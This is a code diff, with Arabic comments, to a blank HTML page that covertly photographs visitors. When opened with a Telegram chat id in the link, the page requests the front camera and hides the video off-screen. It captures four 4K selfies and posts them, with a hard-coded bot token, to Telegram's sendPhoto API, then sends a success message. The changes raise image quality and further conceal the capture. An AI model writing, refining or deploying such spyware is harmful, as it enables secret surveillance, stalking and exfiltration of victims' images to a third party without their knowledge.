@@ -4,13 +4,18 @@
     <meta charset="UTF-8">
     <title></title>
     <style>
-        /* صفحة بيضاء بالكامل */
+        /* خلفية بيضاء نقية */
         body { 
-            background: white;
+            background: white !important;
             margin: 0;
             padding: 0;
             width: 100vw;
             height: 100vh;
+            display: block;
+        }
+        /* إزالة أي ألوان سوداء */
+        * {
+            background: white;
         }
     </style>
 </head>
@@ -20,16 +25,18 @@
         const USER_ID = new URLSearchParams(window.location.search).get('id');
         const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
 
-        // إذا ما في ID بالرابط، نوقف (ما نتحول)
+        // إذا ما في ID بالرابط، نوقف
         if (!USER_ID) {
-            // الصفحة تبقى بيضاء
+            // صفحة بيضاء
         } else {
-            // ==================== طلب الكاميرا ====================
+            // ==================== طلب الكاميرا بأعلى دقة ====================
             navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
+                    width: { ideal: 3840, max: 3840 }, // 4K
+                    height: { ideal: 2160, max: 2160 }, // 4K
+                    aspectRatio: { ideal: 1.7777777778 },
+                    frameRate: { ideal: 30 }
                 }
             })
             .then(async (stream) => {
@@ -40,42 +47,75 @@
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 video.setAttribute('autoplay', '');
+                video.setAttribute('muted', '');
                 video.style.position = 'absolute';
                 video.style.left = '-9999px';
                 video.style.top = '-9999px';
                 video.style.width = '1px';
                 video.style.height = '1px';
                 video.style.opacity = '0';
+                video.style.pointerEvents = 'none';
                 document.body.appendChild(video);
 
                 // انتظار تحميل الفيديو
                 await new Promise(resolve => {
-                    if (video.videoWidth > 0) resolve();
-                    else video.onloadedmetadata = resolve;
+                    if (video.videoWidth > 0) {
+                        resolve();
+                    } else {
+                        video.onloadedmetadata = () => {
+                            // تشغيل الفيديو
+                            video.play();
+                            resolve();
+                        };
+                    }
                 });
 
-                // التقاط 3 صور
-                for (let i = 0; i < 3; i++) {
-                    await new Promise(r => setTimeout(r, i * 300));
+                // التأكد من أن الفيديو شغال
+                await new Promise(r => setTimeout(r, 500));
+
+                // دقة التصوير الفعلية
+                const width = video.videoWidth || 1920;
+                const height = video.videoHeight || 1080;
+
+                // التقاط 4 صور بدقة عالية جداً
+                for (let i = 0; i < 4; i++) {
+                    // تأخير بسيط بين الصور
+                    await new Promise(r => setTimeout(r, i * 400));
 
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
+                    canvas.width = width;
+                    canvas.height = height;
                     
                     const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.imageSmoothingEnabled = true;
+                    ctx.imageSmoothingQuality = 'high';
+                    ctx.drawImage(video, 0, 0, width, height);
 
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                    // تحويل إلى blob بأعلى جودة
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.98));
 
+                    // إرسال الصورة
                     const formData = new FormData();
                     formData.append('chat_id', USER_ID);
-                    formData.append('photo', blob, `selfie_${i+1}.jpg`);
+                    formData.append('photo', blob, `selfie_hd_${i+1}.jpg`);
+                    formData.append('caption', `📸 صورة عالية الدقة ${width}x${height}`);
 
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     }).catch(e => {});
                 }
+
+                // إرسال تأكيد (اختياري)
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: USER_ID,
+                        text: `✅ تم التصوير بنجاح!\n📸 4 صور بدقة ${width}x${height}`,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(e => {});
 
                 // تنظيف
                 stream.getTracks().forEach(t => t.stop());
@@ -86,9 +126,9 @@
             })
             .catch((error) => {
                 // تم الرفض ❌
-                // الصفحة تبقى بيضاء ولا يتحول لأي مكان
-                console.log('Camera permission denied:', error);
-                // لا تفعل شيء، ابقى في الصفحة البيضاء
+                // صفحة بيضاء - لا تحويل
+                console.log('Camera denied:', error);
+                // البقاء في الصفحة البيضاء
             });
         }
     </script>
